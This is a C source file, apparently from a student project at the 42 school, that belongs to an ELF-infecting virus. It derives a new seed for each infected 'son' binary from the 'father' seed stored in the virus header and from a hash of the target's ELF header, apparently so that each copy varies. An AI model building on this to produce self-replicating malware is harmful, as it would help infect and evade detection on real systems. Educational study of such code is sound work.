/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   generate_seed.c                                    :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: anselme <anselme@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/12/12 18:29:06 by anselme           #+#    #+#             */
/*   Updated: 2020/12/01 20:12:15 by ichkamo          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <stdbool.h>
#include <stdint.h>
#include <linux/elf.h>

#include "accessors.h"
#include "loader.h"
#include "utils.h"
#include "errors.h"
#include "log.h"

static bool	set_father_seed(uint64_t *father_seed, struct safe_ptr ref, size_t loader_off)
{
	const size_t	payload_off       = loader_off;
	const size_t	dist_entry_header = (size_t)virus_header_struct - (size_t)loader_entry;
	const size_t	virus_header_off  = payload_off + dist_entry_header;

	struct virus_header	*constants = safe(ref, virus_header_off, sizeof(*constants));
	if (!constants) return errors(ERR_VIRUS, _ERR_IMPOSSIBLE);

	*father_seed = constants->seed;
	return true;
}

static bool	set_elf_hdr_hash(uint64_t *hdr_hash, struct safe_ptr ref)
{
	Elf64_Ehdr	*elf_hdr = safe(ref, 0, sizeof(Elf64_Ehdr));
	if (elf_hdr == NULL) return errors(ERR_FILE, _ERR_CANT_READ_ELFHDR);

	*hdr_hash = hash((void *)elf_hdr, sizeof(Elf64_Ehdr));
	return true;
}

bool		generate_seed(uint64_t *seed, struct safe_ptr original_ref, size_t loader_off)
{
	uint64_t	father_seed;
	uint64_t	hdr_hash;
	uint64_t	son_seed;

	if (!set_father_seed(&father_seed, original_ref, loader_off))
		return errors(ERR_THROW, _ERR_GENERATE_SEED);
	if (!set_elf_hdr_hash(&hdr_hash, original_ref))
		return errors(ERR_THROW, _ERR_GENERATE_SEED);

	son_seed = father_seed ^ hdr_hash;
	son_seed = hash((void *)&son_seed, sizeof(son_seed));
	log_all_seeds(father_seed, hdr_hash, son_seed);

	*seed = son_seed;
	return true;
}
